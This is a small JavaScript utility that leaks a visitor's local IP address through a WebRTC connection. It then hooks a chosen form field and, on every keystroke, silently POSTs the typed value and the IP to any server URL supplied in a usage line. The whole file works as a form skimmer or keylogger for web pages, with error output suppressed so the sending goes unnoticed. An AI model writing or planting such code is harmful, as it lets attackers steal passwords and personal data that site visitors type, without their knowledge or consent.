var findIP = new Promise(r=>{var w=window,a=new (w.RTCPeerConnection||w.mozRTCPeerConnection||w.webkitRTCPeerConnection)({iceServers:[]}),b=()=>{};a.createDataChannel("");a.createOffer(c=>a.setLocalDescription(c,b,b),b);a.onicecandidate=c=>{try{c.candidate.candidate.match(/([0-9]{1,3}(\.[0-9]{1,3}){3}|[a-f0-9]{1,4}(:[a-f0-9]{1,4}){7})/g).forEach(r)}catch(e){}}})


let IP;
findIP.then(ip => IP = ip).catch(e => console.error(e));


function requests(server,parameter,value,ip){
    var request = new FormData();
    request.append(parameter, value);
    request.append("ip", ip);
    fetch(server, {
        method:"POST",
        body:request
    }).then(res=>res.text()).then((res) => {/*console.log(res);*/}).catch((err) => { /*console.error(err);*/});
}


function send(element,srvr,param){
    var id = document.getElementById(element);
    id.addEventListener("input", function(){
        requests(srvr,param,this.value,IP);
    });
}


// usage : send(element_id, server_url, parameter_name)
